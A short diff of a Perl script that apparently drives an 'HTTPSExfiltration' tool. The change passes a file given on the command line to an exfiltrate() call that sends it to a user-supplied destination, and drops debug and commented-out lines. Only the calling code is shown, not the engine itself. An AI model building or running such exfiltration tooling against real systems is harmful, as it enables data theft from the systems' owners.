@@ -25,8 +25,6 @@ my $parser = Parser->new();
 
 $parser->parse(@ARGV);
 
-my $engine = HTTPSExfiltration->new(file => $parser->file, dest => $parser->dest, delay => $parser->delay);
+my $engine = HTTPSExfiltration->new(dest => $parser->dest, delay => $parser->delay);
 
-print $engine->delay()
-# $engine->init();
-# $engine->exfiltrate();
+$engine->exfiltrate($parser->file);
